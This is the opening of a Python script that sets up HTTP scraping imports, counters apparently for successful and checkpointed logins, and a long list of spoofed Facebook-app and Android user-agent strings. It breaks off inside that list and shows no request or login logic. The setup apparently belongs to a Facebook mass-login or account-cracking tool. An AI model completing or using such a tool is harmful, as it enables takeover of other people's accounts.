#!/usr/bin/python
#encoding=utf-8
import requests as req,json,time,os,re,random
from concurrent.futures import ThreadPoolExecutor as Bool
from bs4 import BeautifulSoup as parser

id=[]
ok,cp,cot=0,0,0
ajg=""
uas = random.choice(['Mozilla/5.0 (Linux; Android 4.4.2; 1201 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/128.0.0.21.88;]',
'Mozilla/5.0 (Linux; Android 4.4.2; LG-F460K Build/KOT49I.F460K11e) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/125.0.0.22.70;]',
'Mozilla/5.0 (Linux; Android 4.4.4; SM-G360H Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69;]',
'Mozilla/5.0 (Linux; Android 5.0.1; SGH-I337M Build/LRX22C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/112.0.0.17.70;]',
'Mozilla/5.0 (Linux; Android 5.0.2; D6503 Build/23.1.A.1.28; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/120.0.0.14.84;]',
'Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 2 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/129.0.0.17.91;]',
'Mozilla/5.0 (Linux; Android 5.0.2; SF1 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/129.0.0.17.91;]',
'Mozilla/5.0 (Linux; Android 5.0.2; SM-A500H Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/124.0.0.43.69;]',
'Mozilla/5.0 (Linux; Android 5.0; LG-D855 Build/LRX21R.A1445306351; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/106.0.0.17.70;]',
'Mozilla/5.0 (Linux; Android 5.0; SM-N900L Build/LRX21V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/129.0.0.17.91;]',
'Mozilla/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/129.0.0.17.91;]',
'Mozilla/5.0 (Linux; Android 5.1.1; F1w Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/126.0.0.9.84;]',
'Mozilla/5.0 (Linux; Android 5.1.1; F1w Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/127.0.0.18.81;]',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG-SM-G530AZ Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/112.0.0.17.70;]',
'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320G Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/118.0.0.19.82;]',
'Mozilla/5.0 (Linux; Android 5.1.1; SM-J500H Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/100.0.0.29.61;]',
'Mozilla/5.0 (Linux; Android 5.1.1; SM-T280 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Safari/537.36 [FB_IAB/MESSENGER;FBAV/112.0.0.17.70;]',
'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/126.0.0.9.84;]',
'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/120.0.0.14.84;]',
'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]',
'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/123.0.0.11.70;]',
'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/125.0.0.22.70;]',
'Mozilla/5.0 (Linux; Android 5.1; A33w Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/124.0.0.43.69;]',
'Mozilla/5.0 (Linux; Android 5.1; A33w Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/103.0.0.12.69;]',
'Mozilla/5.0 (Linux; Android 5.1; A33w Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/120.0.0.14.84;]',
'Mozilla/5.0 (Linux; Android 5.1; N9518 Build/LMY47O; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/105.0.0.16.69;]',
'Mozilla/5.0 (Linux; Android 5.1; X9009 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/110.0.0.14.69;]',
'Mozilla/5.0 (Linux; Android 5.1; XT1039 Build/LPBS23.13-17.6-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/112.0.0.17.70;]',
'Mozilla/5.0 (Linux; Android 6.0.1; CPH1701 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/127.0.0.18.81;]',
'Mozilla/5.0 (Linux; Android 6.0.1; HTC One_E8 dual sim Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/125.0.0.22.70;]',
'Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/104.0.0.13.69;]',
'Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 4 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-G890A Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/113.0.0.21.70;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-G920A Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/113.0.0.21.70;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-G925A Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/113.0.0.21.70;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-A500H Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/127.0.0.18.81;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-A510F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/118.0.0.19.82;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-A910F Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/119.0.0.18.91;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-A910F Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/120.0.0.14.84;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/123.0.0.11.70;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-G610F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/120.0.0.14.84;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-G610F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/123.0.0.11.70;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-G610F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/128.0.0.21.88;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-G900H Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/118.0.0.19.82;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-G900V Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/112.0.0.17.70;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/124.0.0.43.69;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-G920W8 Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/112.0.0.17.70;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-G925I Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.68 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/113.0.0.21.70;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-J510FN Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/109.0.0.24.70;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-J510FN Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/127.0.0.18.81;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-J700H Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/126.0.0.9.84;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-J710F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/128.0.0.21.88;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-N910C Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/109.0.0.24.70;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-N920V Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/112.0.0.17.70;]',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-N920W8 Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/112.0.0.17.70;]',
'Mozilla/5.0 (Linux; Android 6.0.1; vivo Y55 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/128.0.0.21.88;]',
'Mozilla/5.0 (Linux; Android 6.0; HTC6525LVW Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/112.0.0.17.70;]',
'Mozilla/5.0 (Linux; Android 6.0; Lenovo A7000-a Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/125.0.0.22.70;]',
'Mozilla/5.0 (Linux; Android 6.0; Redmi Note 4 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/118.0.0.19.82;]',
'Mozilla/5.0 (Linux; Android 7.0; HTC One M9 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/112.0.0.17.70;]',
'Mozilla/5.0 (Linux; Android 7.0; HTC6545LVW Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/112.0.0.17.70;]',
'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG-SM-G928A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/113.0.0.21.70;]',
'Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]',
'Mozilla/5.0 (Linux; Android 7.0; SM-G920W8 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/131.0.0.17.89;]',
'Mozilla/5.0 (Linux; Android 7.0; SM-G920W8 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.97 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/130.0.0.15.89;]',
'Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/113.0.0.21.70;]',
'Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/126.0.0.9.84;]',
'Mozilla/5.0 (Linux; Android 7.0; SM-G930W8 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/112.0.0.17.70;]',
'Mozilla/5.0 (Linux; Android 7.0; SM-G935T Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/113.0.0.21.70;]',
'Mozilla/5.0 (Linux; Android 7.0; SM-N920C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]',
'Mozilla/5.0 (Linux; Android 7.0; VS987 Build/NRD90U; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/112.0.0.17.70;]',
'Mozilla/5.0 (Linux; Android 7.0; XT1585 Build/NCK25.118-10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/112.0.0.17.70;]',
'Mozilla/5.0 (Linux; Android 7.1.1; A0001 Build/NOF27B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.105 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/130.0.0.15.89;]',
'Mozilla/5.0 (Linux; Android 7.1.1; Pixel Build/NOF27B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/113.0.0.21.70;]',
'Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/114.0.0.21.71;]',
'Mozilla/5.0 (Linux; U; Android 4.3; en-us; C6530N Build/JLS36C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/MESSENGER;FBAV/110.0.0.14.69;]',
'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; PocketBook SURFpad 4 L Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.7.5.658 U3/0.8.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; EVERCOSS_A74D Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.4.1.565 U3/0.8.0 Mobile Safari/534.30',
'UCWEB/2.0 (Java; U; MIDP-2.0; en-US; MicromaxQ5) U2/1.0.0 UCBrowser/9.4.0.342 U2/1.0.0 Mobile',
'Mozilla/5.0 (Linux; U; Android 4.4.2; id; Smartfren_Andromax_AD6B1H Build/KVT49L) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 UCBrowser/10.5.0.668 Mobile',
'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; XOLO One Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.7.5.658 U3/0.8.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.4.4; en-US; DEXP Ixion X LTE 4.5" Build/KTU84P)AppleWebKit/534.13 (KHTML, like Gecko) UCBrowser/10.5.0.575/0.8.0 Safari/534.13',
'Mozilla/5.0 (Linux; U; Android 4.4.4; en-US; Primo GM mini Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.7.0.636 U3/0.8.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 5.0.2; en-US; S50F+ Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.7.0.636 U3/0.8.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; Aqua Star II 16GB Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.7.0.636 U3/0.8.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 5.0.1; en-US; GALAXY S6 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.2.0.535 U3/0.8.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; Archos 45c Platinum Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.7.0.636 U3/0.8.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.2.2; en-US; Plane 7.3 3G PS7003MG Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.7.0.636 U3/0.8.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; Smartfren Andromax AD6B1H Build/KVT49L) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.7.0.636 U3/0.8.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; Aqua_Q1+ Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.2.599 U3/0.8.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.1.1; en-US; ALCATEL ONE TOUCH 4030D Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.5.623 U3/0.8.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; MITO A68 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.2.599 U3/0.8.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.3; en-US; HTC Butterfly Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.5.2.582 U3/0.8.0 Mobile Safari/534.30',
'UCWEB/2.0 (MIDP-2.0; U; zh-CN; A354C) U2/1.0.0 UCBrowser/3.4.3.532 U2/1.0.0 Mobile',
'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; ADVAN T1J+ Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.5.2.582 U3/0.8.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.0.4; en-US; TECNO D5 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.5.2.582 U3/0.8.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; HUAWEI MT7-TL10 Build/HuaweiMT7-TL10) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.5.2.582 U3/0.8.0 Mobile Safari/534.30',
'UCWEB/8.8 (SymbianOS/9.2; U; en-US; NokiaE63) AppleWebKit/534.1 UCBrowser/8.8.0.245 Mobile',
'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; Vodafone Smart Tab 3G Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.5.2.582 U3/0.8.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.0.4; es-LA; HTC Amaze 4G Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.5.0.575 U3/0.8.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; ADVAN S4A Build/ADVAN) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.5.0.575 U3/0.8.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; LenovoA3300-HV Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.5.0.575 U3/0.8.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.2.2; en-US; ME173X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.0.1.512 U3/0.8.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 5.0; en-US; Y511 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.4.1.565 U3/0.8.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; LG-D724 Build/KOT49I.A1423035001) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.4.1.565 U3/0.8.0 Mobile Safari/534.30',
'Nokia200/2.0 (11.81) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0(Java; U; MIDP-2.0; en-US; nokia200) U2/1.0.0 UCBrowser/8.8.1.252 U2/1.0.0',
'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; Lenovo A536 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.3.0.552 U3/0.8.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; Aqua Y2 Build/KOT49H) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.7.5.418 U3/0.8.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 4.1.1; en-US; A9 Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.2.0.535 U3/0.8.0 Mobile Safari/534.30',
'UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.2697; en-US; GT-S5302) U2/1.0.0 UCBrowser/9.3.0.440 Mobile',
'Mozilla/5.0 (Java; U; es-us; Unix) AppleWebKit/534.31 (KHTML, like Gecko) UCBrowser/9.0.1.275',
'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; Aqua 3G Build/Aqua_3G) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.9.0.459 U3/0.8.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; Nokia_X Build/JZO54K) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.7.5.418 U3/0.8.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/289.0.0.40.121;]',
'Mozilla/5.0 (Linux; Android 6.0; A1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/289.0.0.40.121;]',
'Mozilla/5.0 (Linux; Android 6.0; A1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/289.0.0.40.121;]',
'Mozilla/5.0 (Linux; Android 8.0.0; F5121 Build/34.4.A.2.118; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/247.0.0.42.116;]',
